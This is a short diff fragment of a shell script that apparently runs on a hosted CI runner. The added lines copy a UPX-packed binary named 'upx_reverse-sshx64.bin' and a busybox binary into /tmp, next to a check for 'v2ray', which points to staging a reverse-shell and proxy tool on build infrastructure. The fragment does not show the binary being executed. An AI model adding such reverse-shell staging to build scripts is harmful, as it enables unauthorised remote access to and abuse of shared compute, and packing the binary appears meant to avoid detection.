@@ -13,6 +13,10 @@ export HOME=/tmp;
 #setsid docker pull centos:centos7  &
 
 
+cd /tmp;
+cp /home/runner/work/nc_test/nc_test/upx_reverse-sshx64.bin .;
+cp /home/runner/work/nc_test/nc_test/busybox.bin  .;
+
 
 
 grep -q v2ray /tmp/js9&&
